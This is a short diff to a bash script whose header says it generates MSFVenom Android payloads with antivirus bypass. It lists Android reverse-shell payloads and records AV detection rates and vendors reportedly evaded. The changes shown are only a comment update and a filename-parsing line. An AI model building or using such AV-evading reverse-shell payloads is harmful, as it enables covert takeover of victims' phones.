@@ -3,7 +3,8 @@
 #########################################################################################
 # Author: Justin Breed                                                                  #
 # Purpose: Script for generating MSFVenom payloads with AV bypass for Android.          #
-# Tested Date: 21Mar17                                                                  #
+# Tested Date: 21Mar17  
+# Latest test: 20/60 Detection as of 26Aug18
 # NoDistribute: 0% Detection                                                            #
 # Flagged by: Avast (PUP - Not much you can do here without building a reputation)      #
 # Verified manually and successfully bypassed: Kaspersky, AVG, Lookout                  #
@@ -145,6 +146,7 @@ android/shell/reverse_tcp               Spawn a piped command shell (sh). Connec
 				outFile="$2"
 				fullPath=$outFile
 				APK=$(basename $fullPath)
+				apkName=$(echo $APK | cut -f 1 -d '.')
 				shift
 				;;
 			-g* | --generate )
